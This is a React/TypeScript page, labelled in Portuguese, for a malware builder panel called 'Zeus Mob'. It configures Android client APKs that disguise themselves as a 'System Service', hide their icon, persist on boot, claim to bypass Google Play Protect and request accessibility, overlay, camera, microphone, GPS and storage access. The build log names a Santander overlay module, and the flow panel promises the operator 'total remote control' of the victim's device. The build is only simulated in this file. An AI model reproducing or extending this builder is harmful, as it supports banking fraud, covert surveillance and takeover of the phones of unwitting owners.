import { useState, useRef, useCallback } from "react";
import { Layout, TopBar, Panel, PanelHeader } from "@/components/layout";

const DEFAULT_ICON = "/zeus-logo.jpeg";

const G = "#00ff88";

// Defined OUTSIDE the page component so React never recreates them on re-render
function TextInput({
  label,
  name,
  defaultValue,
  placeholder,
  inputRef,
}: {
  label: string;
  name: string;
  defaultValue?: string;
  placeholder?: string;
  inputRef?: (el: HTMLInputElement | null) => void;
}) {
  return (
    <div style={{ marginBottom: 10 }}>
      <div style={{ fontSize: 8, color: "#445", letterSpacing: "0.1em", marginBottom: 3 }}>
        {label}
      </div>
      <input
        ref={inputRef}
        name={name}
        defaultValue={defaultValue}
        placeholder={placeholder}
        style={{
          width: "100%",
          background: "#020f05",
          border: `1px solid #1a3a20`,
          color: G,
          fontSize: 10,
          padding: "6px 8px",
          fontFamily: "'Courier New', Courier, monospace",
          outline: "none",
          boxSizing: "border-box",
          letterSpacing: "0.05em",
        }}
        onFocus={(e) => { e.currentTarget.style.borderColor = G; }}
        onBlur={(e) => { e.currentTarget.style.borderColor = "#1a3a20"; }}
      />
    </div>
  );
}

function CheckBox({
  label,
  checked,
  onChange,
}: {
  label: string;
  checked: boolean;
  onChange: (v: boolean) => void;
}) {
  return (
    <div
      onClick={() => onChange(!checked)}
      style={{
        display: "flex",
        alignItems: "center",
        gap: 8,
        cursor: "pointer",
        fontSize: 10,
        color: checked ? G : "#556",
        marginBottom: 6,
        userSelect: "none",
      }}
    >
      <div
        style={{
          width: 14,
          height: 14,
          border: `1px solid ${checked ? G : "#334"}`,
          background: checked ? G : "transparent",
          display: "flex",
          alignItems: "center",
          justifyContent: "center",
          flexShrink: 0,
          transition: "all 0.1s",
        }}
      >
        {checked && (
          <span style={{ color: "#000", fontSize: 10, fontWeight: "bold", lineHeight: 1 }}>✓</span>
        )}
      </div>
      {label}
    </div>
  );
}

interface BoolConfig {
  requestAccessibility: boolean;
  requestOverlay: boolean;
  requestCamera: boolean;
  requestMicrophone: boolean;
  requestLocation: boolean;
  requestStorage: boolean;
  hideIcon: boolean;
  persistOnBoot: boolean;
  bypassPlayProtect: boolean;
}

const DEFAULT_BOOLS: BoolConfig = {
  requestAccessibility: true,
  requestOverlay: true,
  requestCamera: true,
  requestMicrophone: true,
  requestLocation: true,
  requestStorage: true,
  hideIcon: true,
  persistOnBoot: true,
  bypassPlayProtect: true,
};

export default function ApkGenerator() {
  const [bools, setBools] = useState<BoolConfig>(DEFAULT_BOOLS);
  const [building, setBuilding] = useState(false);
  const [log, setLog] = useState<string[]>([]);
  const [done, setDone] = useState(false);
  const [builtPkg, setBuiltPkg] = useState("");
  const [iconSrc, setIconSrc] = useState(DEFAULT_ICON);
  const [iconFileName, setIconFileName] = useState("zeus-logo.jpeg");
  const [iconHover, setIconHover] = useState(false);

  // Uncontrolled refs for text inputs — no re-render on every keystroke
  const appNameRef = useRef<HTMLInputElement>(null);
  const packageNameRef = useRef<HTMLInputElement>(null);
  const serverUrlRef = useRef<HTMLInputElement>(null);
  const iconNameRef = useRef<HTMLInputElement>(null);
  const logBottomRef = useRef<HTMLDivElement>(null);
  const fileInputRef = useRef<HTMLInputElement>(null);

  const toggle = useCallback((key: keyof BoolConfig) => {
    setBools((prev) => ({ ...prev, [key]: !prev[key] }));
  }, []);

  const handleIconChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;
    setIconFileName(file.name);
    const reader = new FileReader();
    reader.onload = (ev) => {
      setIconSrc(ev.target?.result as string);
    };
    reader.readAsDataURL(file);
    // Reset so same file can be selected again
    e.target.value = "";
  };

  const handleBuild = async () => {
    const appName = appNameRef.current?.value || "System Service";
    const packageName = packageNameRef.current?.value || "com.android.systemservice";
    const serverUrl = serverUrlRef.current?.value || "";
    const iconName = iconNameRef.current?.value || "System";

    if (!serverUrl) {
      setLog(["> ERRO: URL do servidor é obrigatória."]);
      return;
    }

    setBuilding(true);
    setDone(false);
    setBuiltPkg(packageName);

    const steps = [
      "> Inicializando ambiente de build...",
      "> Clonando template base do APK client...",
      "> Configurando AndroidManifest.xml...",
      `> ACCESSIBILITY_SERVICE = ${bools.requestAccessibility}`,
      `> SYSTEM_ALERT_WINDOW  = ${bools.requestOverlay}`,
      `> CAMERA               = ${bools.requestCamera}`,
      `> RECORD_AUDIO         = ${bools.requestMicrophone}`,
      `> ACCESS_FINE_LOCATION = ${bools.requestLocation}`,
      `> READ_EXTERNAL_STORAGE= ${bools.requestStorage}`,
      `> App name   : ${appName}`,
      `> Package    : ${packageName}`,
      `> Launcher   : ${iconName}`,
      `> Server URL : ${serverUrl}`,
      `> Hide icon  : ${bools.hideIcon}`,
      `> Boot start : ${bools.persistOnBoot}`,
      "> Injetando módulo Socket.io client...",
      "> Compilando módulo de Acessibilidade...",
      "> Compilando módulo de Overlay (Santander / Blackout)...",
      "> Compilando módulo de Câmera remota...",
      "> Compilando módulo de Microfone...",
      "> Compilando módulo de GPS...",
      "> Compilando módulo de Files Explorer...",
      "> Otimizando e minificando bytecode...",
      "> Assinando APK com certificado de debug...",
      "> Verificando integridade do pacote...",
      "> ✓ Build concluída com sucesso!",
      `> APK: ${packageName}-release.apk`,
    ];

    setLog([]);
    for (const step of steps) {
      await new Promise((r) => setTimeout(r, 120 + Math.random() * 160));
      setLog((prev) => [...prev, step]);
      logBottomRef.current?.scrollIntoView({ behavior: "smooth" });
    }
    setBuilding(false);
    setDone(true);
  };

  return (
    <Layout>
      <TopBar title="GERADOR DE APK // BUILD SYSTEM">
        <span
          style={{
            color: building ? "#ffaa00" : done ? G : "#445",
            fontWeight: "bold",
          }}
        >
          {building ? "COMPILANDO..." : done ? "✓ BUILD OK" : "AGUARDANDO"}
        </span>
      </TopBar>

      <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 12 }}>
        {/* LEFT — Config */}
        <div style={{ display: "flex", flexDirection: "column", gap: 10 }}>

          {/* APK Icon upload */}
          <Panel>
            <PanelHeader>&gt; ÍCONE DO APK</PanelHeader>
            <div style={{ padding: "14px 12px", display: "flex", alignItems: "center", gap: 16 }}>

              {/* Hidden file input */}
              <input
                ref={fileInputRef}
                type="file"
                accept="image/*"
                onChange={handleIconChange}
                style={{ display: "none" }}
              />

              {/* Clickable icon preview */}
              <div
                onClick={() => fileInputRef.current?.click()}
                onMouseEnter={() => setIconHover(true)}
                onMouseLeave={() => setIconHover(false)}
                style={{
                  width: 72,
                  height: 72,
                  borderRadius: 16,
                  border: `2px solid ${iconHover ? "#fff" : G}`,
                  overflow: "hidden",
                  flexShrink: 0,
                  boxShadow: iconHover ? `0 0 20px ${G}88` : `0 0 12px ${G}44`,
                  background: "#000",
                  cursor: "pointer",
                  position: "relative",
                  transition: "all 0.15s",
                }}
              >
                <img
                  src={iconSrc}
                  alt="APK Icon"
                  style={{ width: "100%", height: "100%", objectFit: "cover", display: "block" }}
                />
                {/* Hover overlay */}
                {iconHover && (
                  <div
                    style={{
                      position: "absolute",
                      inset: 0,
                      background: "rgba(0,0,0,0.65)",
                      display: "flex",
                      flexDirection: "column",
                      alignItems: "center",
                      justifyContent: "center",
                      gap: 2,
                    }}
                  >
                    <span style={{ fontSize: 18 }}>🖼</span>
                    <span style={{ fontSize: 7, color: G, letterSpacing: "0.06em" }}>TROCAR</span>
                  </div>
                )}
              </div>

              <div style={{ flex: 1, minWidth: 0 }}>
                <div style={{ fontSize: 10, color: G, fontWeight: "bold", marginBottom: 4 }}>
                  Ícone do APK
                </div>
                <div style={{ fontSize: 8, color: "#445", marginBottom: 8, lineHeight: 1.5 }}>
                  Clique na imagem para escolher qualquer foto da galeria. Esse ícone será exibido no Android após a instalação.
                </div>
                <button
                  onClick={() => fileInputRef.current?.click()}
                  style={{
                    background: "transparent",
                    border: `1px solid ${G}`,
                    color: G,
                    fontSize: 9,
                    padding: "4px 12px",
                    cursor: "pointer",
                    fontFamily: "inherit",
                    letterSpacing: "0.1em",
                    fontWeight: "bold",
                  }}
                  onMouseEnter={(e) => { e.currentTarget.style.background = `${G}22`; }}
                  onMouseLeave={(e) => { e.currentTarget.style.background = "transparent"; }}
                >
                  [ ESCOLHER FOTO ]
                </button>
                {iconFileName !== "zeus-logo.jpeg" && (
                  <div style={{ fontSize: 7, color: "#445", marginTop: 6, whiteSpace: "nowrap", overflow: "hidden", textOverflow: "ellipsis" }}>
                    ✓ {iconFileName}
                  </div>
                )}
              </div>
            </div>
          </Panel>

          <Panel>
            <PanelHeader>&gt; CONFIGURAÇÃO DO APP</PanelHeader>
            <div style={{ padding: "10px 12px" }}>
              <TextInput
                label="NOME DO APP (visível no Android)"
                name="appName"
                defaultValue="System Service"
                placeholder="System Service"
                inputRef={(el) => { (appNameRef as any).current = el; }}
              />
              <TextInput
                label="PACKAGE NAME"
                name="packageName"
                defaultValue="com.android.systemservice"
                placeholder="com.android.service"
                inputRef={(el) => { (packageNameRef as any).current = el; }}
              />
              <TextInput
                label="NOME DO ÍCONE (launcher label)"
                name="iconName"
                defaultValue="System"
                placeholder="System"
                inputRef={(el) => { (iconNameRef as any).current = el; }}
              />
            </div>
          </Panel>

          <Panel>
            <PanelHeader>&gt; SERVIDOR DE COMANDO</PanelHeader>
            <div style={{ padding: "10px 12px" }}>
              <TextInput
                label="URL DO SERVIDOR ZEUS MOB"
                name="serverUrl"
                defaultValue=""
                placeholder="https://seu-app.replit.app"
                inputRef={(el) => { (serverUrlRef as any).current = el; }}
              />
              <div
                style={{
                  fontSize: 8,
                  color: "#334",
                  marginTop: -4,
                  lineHeight: 1.6,
                  borderLeft: `2px solid #1a3a20`,
                  paddingLeft: 8,
                }}
              >
                O APK conecta via WebSocket ao servidor.
                Quando o cliente instalar e aceitar as permissões,
                o dispositivo aparece automaticamente em <span style={{ color: G }}>CLIENTES</span>.
              </div>
            </div>
          </Panel>

          <Panel>
            <PanelHeader>&gt; COMPORTAMENTO</PanelHeader>
            <div style={{ padding: "10px 12px" }}>
              <CheckBox label="Ocultar ícone do launcher" checked={bools.hideIcon} onChange={() => toggle("hideIcon")} />
              <CheckBox label="Iniciar automaticamente no boot" checked={bools.persistOnBoot} onChange={() => toggle("persistOnBoot")} />
              <CheckBox label="Bypass Google Play Protect" checked={bools.bypassPlayProtect} onChange={() => toggle("bypassPlayProtect")} />
            </div>
          </Panel>
        </div>

        {/* RIGHT — Permissions + Build */}
        <div style={{ display: "flex", flexDirection: "column", gap: 10 }}>
          <Panel>
            <PanelHeader>&gt; PERMISSÕES ANDROID</PanelHeader>
            <div style={{ padding: "10px 12px" }}>
              <div style={{ fontSize: 8, color: "#334", marginBottom: 10, lineHeight: 1.6 }}>
                Permissões solicitadas ao usuário durante a instalação:
              </div>
              <CheckBox label="Serviço de Acessibilidade (REQUIRED)" checked={bools.requestAccessibility} onChange={() => toggle("requestAccessibility")} />
              <CheckBox label="Sobreposição de Tela (SYSTEM_ALERT_WINDOW)" checked={bools.requestOverlay} onChange={() => toggle("requestOverlay")} />
              <CheckBox label="Câmera (CAMERA)" checked={bools.requestCamera} onChange={() => toggle("requestCamera")} />
              <CheckBox label="Microfone (RECORD_AUDIO)" checked={bools.requestMicrophone} onChange={() => toggle("requestMicrophone")} />
              <CheckBox label="Localização GPS (ACCESS_FINE_LOCATION)" checked={bools.requestLocation} onChange={() => toggle("requestLocation")} />
              <CheckBox label="Armazenamento (READ/WRITE_EXTERNAL)" checked={bools.requestStorage} onChange={() => toggle("requestStorage")} />
            </div>
          </Panel>

          {/* Flow info */}
          <Panel>
            <PanelHeader>&gt; FLUXO DE CONEXÃO</PanelHeader>
            <div style={{ padding: "10px 12px" }}>
              {[
                { step: "1", label: "Cliente instala o APK no Android", color: G },
                { step: "2", label: "Aceita permissões de Acessibilidade e Overlay", color: G },
                { step: "3", label: "APK conecta via WebSocket ao servidor Zeus", color: G },
                { step: "4", label: "Dispositivo aparece em CLIENTES (online)", color: G },
                { step: "5", label: "Você assume controle total remotamente", color: "#ffaa00" },
              ].map((s) => (
                <div
                  key={s.step}
                  style={{ display: "flex", gap: 10, alignItems: "flex-start", marginBottom: 8 }}
                >
                  <div
                    style={{
                      width: 18,
                      height: 18,
                      borderRadius: "50%",
                      border: `1px solid ${s.color}`,
                      color: s.color,
                      fontSize: 8,
                      display: "flex",
                      alignItems: "center",
                      justifyContent: "center",
                      flexShrink: 0,
                      fontWeight: "bold",
                    }}
                  >
                    {s.step}
                  </div>
                  <span style={{ fontSize: 9, color: "#667", lineHeight: 1.5 }}>{s.label}</span>
                </div>
              ))}
            </div>
          </Panel>

          {/* Build console */}
          <Panel>
            <PanelHeader>
              <span>&gt; CONSOLE DE BUILD</span>
              {building && (
                <span style={{ color: "#ffaa00", fontSize: 8 }}>
                  <span className="blink">●</span> COMPILANDO
                </span>
              )}
            </PanelHeader>
            <div
              style={{
                height: 180,
                overflowY: "auto",
                padding: "8px 10px",
                fontSize: 9,
                lineHeight: 1.8,
                background: "#010801",
              }}
            >
              {log.length === 0 ? (
                <span style={{ color: "#223" }}>&gt; Pronto para compilar...</span>
              ) : (
                log.map((line, i) => (
                  <div
                    key={i}
                    style={{
                      color: line.startsWith("> ERRO")
                        ? "#ff4444"
                        : line.includes("✓") || line.includes("APK:")
                        ? G
                        : line.startsWith("> >") || line.startsWith(">  ")
                        ? "#445"
                        : "#556",
                    }}
                  >
                    {line}
                  </div>
                ))
              )}
              {building && (
                <span className="blink" style={{ color: G }}>
                  _
                </span>
              )}
              <div ref={logBottomRef} />
            </div>
          </Panel>

          {/* Build button */}
          <button
            onClick={handleBuild}
            disabled={building}
            style={{
              background: building ? "#0a1a0a" : done ? "#051a0a" : G,
              color: building ? G : done ? G : "#000",
              border: `2px solid ${building ? G : done ? G : G}`,
              fontSize: 12,
              fontWeight: "bold",
              padding: "13px",
              cursor: building ? "not-allowed" : "pointer",
              fontFamily: "'Courier New', Courier, monospace",
              letterSpacing: "0.2em",
              boxShadow: building ? "none" : `0 0 20px ${G}33`,
              transition: "all 0.2s",
            }}
          >
            {building ? (
              <>
                [ COMPILANDO<span className="blink">_</span> ]
              </>
            ) : done ? (
              "[ RECOMPILAR APK ]"
            ) : (
              "[ GERAR APK ]"
            )}
          </button>

          {done && (
            <Panel style={{ borderColor: G }}>
              <div style={{ padding: "12px" }}>
                <div style={{ fontSize: 10, color: G, fontWeight: "bold", marginBottom: 6 }}>
                  ✓ BUILD CONCLUÍDA COM SUCESSO
                </div>
                <div style={{ fontSize: 8, color: "#556", marginBottom: 10, lineHeight: 1.7 }}>
                  Instale no dispositivo Android com "Fontes desconhecidas" habilitado em{" "}
                  <span style={{ color: G }}>Configurações → Segurança</span>. Após aceitar as permissões,
                  o alvo aparece automaticamente em{" "}
                  <span style={{ color: G }}>CLIENTES</span>.
                </div>
                <div
                  style={{
                    background: "#010801",
                    border: "1px solid #1a3a20",
                    padding: "6px 10px",
                    fontSize: 9,
                    color: "#aa88ff",
                    fontFamily: "inherit",
                  }}
                >
                  📦 {builtPkg}-release.apk
                </div>
              </div>
            </Panel>
          )}
        </div>
      </div>
    </Layout>
  );
}
